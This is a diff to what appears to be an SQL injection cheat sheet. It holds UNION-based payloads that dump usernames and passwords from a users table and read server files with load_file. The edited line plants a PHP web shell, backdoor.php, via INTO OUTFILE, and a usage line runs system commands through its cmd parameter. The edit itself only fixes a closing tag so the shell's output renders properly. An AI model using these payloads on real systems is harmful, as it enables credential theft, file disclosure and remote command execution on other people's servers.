@@ -31,7 +31,7 @@ UNION all select 1, username, password from users
 UNION all select 1,2, load_file('path/to/file')
 ```
 ```
-UNION all select 1,2,"<?php echo '<pre>' .shell_exec($_GET['cmd']). '</pre';?>" into OUTFILE'path/to/backdoor.php'
+UNION all select 1,2,"<?php echo '<pre>' .shell_exec($_GET['cmd']). '</pre>';?>" into OUTFILE'path/to/backdoor.php'
 ----
 (ip/backdoor.php?cmd=ipconfig)
 ```
